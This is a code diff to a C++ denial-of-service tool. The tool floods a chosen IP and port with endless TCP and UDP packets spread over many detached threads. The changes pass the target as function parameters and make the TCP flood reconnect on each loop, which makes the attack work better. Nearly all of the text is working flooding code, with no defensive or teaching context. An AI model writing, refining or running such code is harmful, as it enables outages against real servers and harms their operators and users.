@@ -8,39 +8,40 @@
 #include<sys/types.h>
 #include<arpa/inet.h>
 
-char target_ip[16]{0};
+char target_ip[16];
 int target_port = 0;
 int attack_thread = 0;
 char attack_method[4]{0};
 int attack_delay = 0;
 
-void tcpflood()
+void tcpflood(const char* ip, int port, int delay)
 {
     sockaddr_in target{0};
     target.sin_family = AF_INET;
-    target.sin_addr.s_addr = inet_addr(target_ip);
-    target.sin_port = htons(target_port);
+    target.sin_addr.s_addr = inet_addr(ip);
+    target.sin_port = htons(port);
 
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
-
-    char packet[1024]{0};
+    char packet[1024];
     for(int i = 0; i < 1024; i++) {
         packet[i] = rand();
     }
 
-    while(true) {
+    while(true)
+    {
+        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
         send(sock, packet, sizeof(packet), 0);
-        usleep(attack_delay * 1000);
+        close(sock);
+        usleep(delay * 1000);
     }
 }
 
-void udpflood()
+void udpflood(const char* ip, int port, int delay)
 {
     sockaddr_in target{0};
     target.sin_family = AF_INET;
-    target.sin_addr.s_addr = inet_addr(target_ip);
-    target.sin_port = htons(target_port);
+    target.sin_addr.s_addr = inet_addr(ip);
+    target.sin_port = htons(port);
 
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
@@ -51,7 +52,7 @@ void udpflood()
 
     while(true) {
         sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
-        usleep(attack_delay * 1000);
+        usleep(delay * 1000);
     }
 }
 
@@ -59,20 +60,21 @@ void create_thread()
 {
     if(strcmp(attack_method, "tcp") == 0) {
         for(int i = 0; i < attack_thread; i++) {
-            std::thread(tcpflood).detach();
+            std::thread(tcpflood, target_ip, target_port, attack_delay).detach();
         }
     }
 
+
     else if(strcmp(attack_method, "udp") == 0) {
         for(int i = 0; i < attack_thread; i++) {
-            std::thread(udpflood).detach();
+            std::thread(udpflood, target_ip, target_port, attack_delay).detach();
         }
     }
 }
 
 int main(int argc, char** argv)
 {
-    for(int i = 1; i < argc; i++)
+    for(int i = 0; i < argc; i++)
     {
         /* Show Version */
         if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0)
@@ -163,7 +165,6 @@ int main(int argc, char** argv)
     create_thread();
 
     std::cout << " press ctrl+c or enter key to exit ... " << std::endl;
-
     std::cin.get();
     return 0;
 }
